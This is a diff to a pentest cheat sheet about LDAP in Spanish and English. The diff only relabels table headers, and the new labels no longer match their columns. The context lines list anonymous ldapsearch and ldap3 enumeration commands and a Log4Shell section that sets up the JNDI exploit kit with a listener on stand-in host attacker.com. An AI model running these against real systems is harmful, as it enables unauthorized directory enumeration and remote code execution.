@@ -24,7 +24,7 @@ linked:
 
 ## ldapsearch CLI
 
-| **Función** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Anonymous bind + base info | `ldapsearch -H ldap://target -x -s base -b ""` | RootDSE. |
 | Discover naming context | `ldapsearch ... -b "" "(objectClass=*)" namingContexts` | Find base DN. |
@@ -50,7 +50,7 @@ ___
 
 ## ldap3 (Python lib)
 
-| **Función** | **Code** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Install | `pip install ldap3` | Pure Python, no dependencies. |
 | Connect anonymous | `from ldap3 import Server, Connection; conn = Connection(Server('ldap://target')); conn.bind()` | Standard. |
@@ -106,7 +106,7 @@ ___
 
 ## JNDI Exploit Kits (Log4Shell)
 
-| **Tool** | **Comando** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | JNDI-Injection-Exploit (welk1n) | `git clone https://github.com/welk1n/JNDI-Injection-Exploit` | Java-based. |
 | JNDIExploit setup | `java -jar JNDIExploit-1.4-SNAPSHOT.jar -i attacker.com -p 1389` | Listen 1389 LDAP. |
